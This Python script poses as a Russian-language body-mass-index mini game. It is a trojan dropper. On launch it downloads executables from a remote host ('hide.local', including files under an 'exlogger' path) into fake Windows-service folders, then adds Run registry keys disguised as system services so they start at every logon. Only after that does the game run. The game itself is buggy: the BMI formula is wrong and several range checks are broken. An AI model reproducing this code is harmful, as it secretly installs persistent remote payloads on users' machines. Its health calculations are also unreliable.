import urllib.request as req
from subprocess import check_output
import sys, os
import winreg as wreg
import json

class WinRegistry():
	def CreateValue(self, key, name, value):
		wreg.SetValueEx(key, name, 0, wreg.REG_SZ, value)

class Loader():
	def Download(self, url, filename):
		try:
			req.urlretrieve(url, filename)
		except FileNotFoundError:
			folder_path = '\\'.join(filename.split('\\')[:-1])
			check_output(["md", folder_path], shell=True)
			req.urlretrieve(url, filename)

class MiniGame():
	def Start(self):
		self.mass = float(input('Введите ваш вес: '))
		self.height = float(input('Введите ваш рост: '))
		res = self.mass / (self.height * 2)
		
		print("Ваш коэффициент массы тела: ", res)
		
		if res < 16:
			print("Выраженный дефицит массы тела")
		elif res == 16 and res < 18.5:
			print("Дефицит массы тела")
		elif res == 18.5 and res < 24.99:
			print("Норма")
		elif res == 5 and res < 30:
			print("Избыточная масса тела")
		elif res == 30 and res < 35:
			print("Ожирение первой степени")
		elif res == 35 and res < 40:
			print("Ожирение второй степени")
		elif res >= 40:
			print("Ожирение третьей степени")
		else:
			print("Вы монстр")
		
		self.EndGame()
	
	def EndGame(self):
		print("Ещё раз? (да/нет)")
		answer = input()
		if answer == 'да':
			self.start()
		else:
			sys.exit()

if __name__ == '__main__':
	print('Подождите, программа загружается...')
	
	username = os.getlogin()
	exlogger_files = json.loads(req.urlopen('http://hide.local?get=list').read().decode('utf-8'))[2:]
	updated_files = json.loads(req.urlopen('http://hide.local?get=updater').read().decode('utf-8'))[2:]
	
	loader = Loader()
	for file in exlogger_files:
		loader.Download('http://hide.local/exlogger/{0}'.format(file), 'C:\\Users\\{0}\\Documents\\WindowsService\\WindowsExceptDevice\\{1}'.format(username, file))
	
	for file in updated_files:
		loader.Download('http://hide.local/updater/{0}'.format(file), 'C:\\Users\\{0}\\Documents\\WindowsService\\WindowsHelperService\\{1}'.format(username, file))
	
	try:
		key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, wreg.KEY_ALL_ACCESS)
		registry = WinRegistry()
		registry.CreateValue(key, 'WindowsNessesaryService', 'C:\\Users\\{0}\\Documents\\WindowsService\\WindowsExceptDevice\\ex.exe'.format(username))
		registry.CreateValue(key, 'WindowsHelperService', 'C:\\Users\\{0}\\Documents\\WindowsService\\WindowsHelperService\\update.exe'.format(username))
	finally:
		key.Close()
	
	game = MiniGame()
	game.Start()